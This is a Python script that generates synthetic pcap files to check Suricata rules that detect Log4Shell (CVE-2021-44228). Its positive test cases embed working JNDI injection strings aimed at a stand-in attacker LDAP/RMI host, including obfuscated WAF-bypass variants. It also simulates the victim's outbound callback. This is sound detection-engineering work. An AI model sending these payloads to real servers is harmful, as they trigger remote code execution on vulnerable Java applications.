#!/usr/bin/env python3
"""
generate_test_pcaps.py
======================
Generates synthetic pcap files for validating Log4Shell (CVE-2021-44228)
Suricata detection rules.

Each pcap tests a specific rule or evasion variant. The test harness
(test_rules.py) runs Suricata against each pcap and asserts expected
alert SIDs fire (positive cases) or do not fire (negative cases).

No third-party dependencies beyond scapy.
Install: pip install scapy

Usage:
    python generate_test_pcaps.py
    # outputs pcaps/ directory with one .pcap per test case
"""

import os
import struct
import socket

PCAP_DIR = os.path.join(os.path.dirname(__file__), "..", "pcaps")
os.makedirs(PCAP_DIR, exist_ok=True)


# ---------------------------------------------------------------------------
# Minimal pcap writer — zero external dependencies
# ---------------------------------------------------------------------------

PCAP_GLOBAL_HEADER = struct.pack(
    "<IHHiIII",
    0xA1B2C3D4,  # magic number
    2, 4,         # major, minor version
    0,            # GMT offset
    0,            # timestamp accuracy
    65535,        # snaplen
    1,            # link type: Ethernet
)

def _eth_ip_tcp(src_ip, dst_ip, src_port, dst_port, payload: bytes) -> bytes:
    """Minimal Ethernet + IP + TCP frame. No checksums (Suricata handles it)."""
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    ip_len = 20 + 20 + len(payload)

    eth = b"\x00" * 6 + b"\x00" * 6 + b"\x08\x00"          # dst mac, src mac, ethertype
    ip  = struct.pack(">BBHHHBBH4s4s",
        0x45, 0, ip_len, 0xABCD, 0x40, 64, 6, 0, src, dst)  # TCP proto=6
    tcp = struct.pack(">HHIIBBHHH",
        src_port, dst_port,
        1000, 2000,           # seq, ack
        0x50, 0x18,           # data offset, flags (PSH+ACK)
        65535, 0, 0)          # window, checksum, urgent
    return eth + ip + tcp + payload

def write_pcap(filename: str, packets: list[bytes]):
    path = os.path.join(PCAP_DIR, filename)
    with open(path, "wb") as f:
        f.write(PCAP_GLOBAL_HEADER)
        for pkt in packets:
            ts_sec  = 1640000000
            ts_usec = 0
            f.write(struct.pack("<IIII", ts_sec, ts_usec, len(pkt), len(pkt)))
            f.write(pkt)
    print(f"  wrote {filename} ({len(packets)} packet{'s' if len(packets)!=1 else ''})")


def http_request(method: str, path: str, headers: dict, body: str = "") -> bytes:
    """Build a raw HTTP/1.1 request."""
    lines = [f"{method} {path} HTTP/1.1"]
    lines += [f"{k}: {v}" for k, v in headers.items()]
    if body:
        lines.append(f"Content-Length: {len(body.encode())}")
    lines += ["", body]
    return "\r\n".join(lines).encode()


# ---------------------------------------------------------------------------
# Test case definitions
# ---------------------------------------------------------------------------

ATTACKER = "192.168.1.100"
VICTIM   = "10.0.0.50"
CALLBACK = "198.51.100.10"   # attacker LDAP server (TEST-NET-3, RFC 5737)

def make_pcaps():
    print("Generating test pcaps...")

    # ------------------------------------------------------------------
    # POSITIVE TEST 1: Basic JNDI in User-Agent (should fire sid:9100001)
    # ------------------------------------------------------------------
    pkt = _eth_ip_tcp(ATTACKER, VICTIM, 54321, 80,
        http_request("GET", "/", {
            "Host": "vulnerable-app.example.com",
            "User-Agent": "${jndi:ldap://198.51.100.10:1389/exploit}",
            "Accept": "*/*",
        })
    )
    write_pcap("positive_01_jndi_useragent.pcap", [pkt])

    # ------------------------------------------------------------------
    # POSITIVE TEST 2: JNDI in X-Forwarded-For header (sid:9100001)
    # ------------------------------------------------------------------
    pkt = _eth_ip_tcp(ATTACKER, VICTIM, 54322, 80,
        http_request("GET", "/search", {
            "Host": "vulnerable-app.example.com",
            "User-Agent": "Mozilla/5.0",
            "X-Forwarded-For": "${jndi:ldap://198.51.100.10:1389/a}",
        })
    )
    write_pcap("positive_02_jndi_xforwardedfor.pcap", [pkt])

    # ------------------------------------------------------------------
    # POSITIVE TEST 3: JNDI in URI (should fire sid:9100002)
    # ------------------------------------------------------------------
    pkt = _eth_ip_tcp(ATTACKER, VICTIM, 54323, 80,
        http_request("GET",
            "/${jndi:ldap://198.51.100.10:1389/exploit}",
            {"Host": "vulnerable-app.example.com", "User-Agent": "curl/7.68"}
        )
    )
    write_pcap("positive_03_jndi_uri.pcap", [pkt])

    # ------------------------------------------------------------------
    # POSITIVE TEST 4: Obfuscated nested expression (sid:9100003)
    #   ${${lower:j}ndi:ldap://...} — common WAF bypass seen in the wild
    # ------------------------------------------------------------------
    pkt = _eth_ip_tcp(ATTACKER, VICTIM, 54324, 80,
        http_request("GET", "/", {
            "Host": "vulnerable-app.example.com",
            "User-Agent": "${${lower:j}ndi:ldap://198.51.100.10:1389/x}",
        })
    )
    write_pcap("positive_04_obfuscated_lower.pcap", [pkt])

    # ------------------------------------------------------------------
    # POSITIVE TEST 5: Heavy obfuscation — character substitution chain
    #   ${${::-j}${::-n}${::-d}${::-i}:ldap://...}
    # ------------------------------------------------------------------
    payload = "${${::-j}${::-n}${::-d}${::-i}:ldap://198.51.100.10:1389/exploit}"
    pkt = _eth_ip_tcp(ATTACKER, VICTIM, 54325, 80,
        http_request("GET", "/", {
            "Host": "vulnerable-app.example.com",
            "User-Agent": payload,
        })
    )
    write_pcap("positive_05_obfuscated_charsubstitution.pcap", [pkt])

    # ------------------------------------------------------------------
    # POSITIVE TEST 6: RMI protocol variant (sid:9100004)
    # ------------------------------------------------------------------
    pkt = _eth_ip_tcp(ATTACKER, VICTIM, 54326, 80,
        http_request("POST", "/api/login", {
            "Host": "vulnerable-app.example.com",
            "Content-Type": "application/json",
            "User-Agent": "${jndi:rmi://198.51.100.10:1099/exploit}",
        }, body='{"user":"admin","pass":"test"}')
    )
    write_pcap("positive_06_rmi_variant.pcap", [pkt])

    # ------------------------------------------------------------------
    # POSITIVE TEST 7: Outbound LDAP callback (sid:9100005)
    #   Simulates vulnerable server connecting back to attacker on port 389
    # ------------------------------------------------------------------
    # TCP SYN from victim server to attacker LDAP (flags=0x02 SYN)
    src  = socket.inet_aton(VICTIM)
    dst  = socket.inet_aton(CALLBACK)
    eth  = b"\x00"*6 + b"\x00"*6 + b"\x08\x00"
    ip   = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 40, 0xABCE, 0x40, 64, 6, 0, src, dst)
    tcp  = struct.pack(">HHIIBBHHH", 49152, 389, 3000, 0, 0x50, 0x02, 65535, 0, 0)
    pkt  = eth + ip + tcp
    write_pcap("positive_07_outbound_ldap_callback.pcap", [pkt])

    # ------------------------------------------------------------------
    # NEGATIVE TEST 1: Normal HTTP request — should NOT fire any rule
    # ------------------------------------------------------------------
    pkt = _eth_ip_tcp("10.0.0.1", VICTIM, 55000, 80,
        http_request("GET", "/index.html", {
            "Host": "example.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept": "text/html",
        })
    )
    write_pcap("negative_01_benign_http.pcap", [pkt])

    # ------------------------------------------------------------------
    # NEGATIVE TEST 2: Legitimate JNDI-like string in app response body
    #   (server->client direction, rules only inspect to_server)
    # ------------------------------------------------------------------
    pkt = _eth_ip_tcp(VICTIM, "10.0.0.1", 80, 55001,
        b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n"
        b"Error: ${jndi:ldap://internal} not resolved"
    )
    write_pcap("negative_02_jndi_in_response_not_request.pcap", [pkt])

    # ------------------------------------------------------------------
    # NEGATIVE TEST 3: Dollar sign and braces in URL param (not JNDI)
    #   e.g. template engines, shell variable expansion in logs
    # ------------------------------------------------------------------
    pkt = _eth_ip_tcp("10.0.0.2", VICTIM, 55002, 80,
        http_request("GET", "/search?q=${query}&page=1", {
            "Host": "example.com",
            "User-Agent": "Mozilla/5.0",
        })
    )
    write_pcap("negative_03_dollar_brace_not_jndi.pcap", [pkt])

    # ------------------------------------------------------------------
    # NEGATIVE TEST 4: Legitimate outbound LDAP to known AD server
    #   (in practice, suppress via GreyNoise benign classifier or
    #    Suricata suppress rule targeting known-good LDAP IPs)
    # ------------------------------------------------------------------
    src = socket.inet_aton(VICTIM)
    dst = socket.inet_aton("10.0.0.5")   # internal AD server — known good
    eth = b"\x00"*6 + b"\x00"*6 + b"\x08\x00"
    ip  = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 40, 0xABCF, 0x40, 64, 6, 0, src, dst)
    tcp = struct.pack(">HHIIBBHHH", 49153, 389, 4000, 0, 0x50, 0x02, 65535, 0, 0)
    pkt = eth + ip + tcp
    write_pcap("negative_04_legitimate_internal_ldap.pcap", [pkt])

    print(f"\nDone. Pcaps written to {PCAP_DIR}/")
    print("Run test_rules.py to validate against Suricata.")


if __name__ == "__main__":
    make_pcaps()
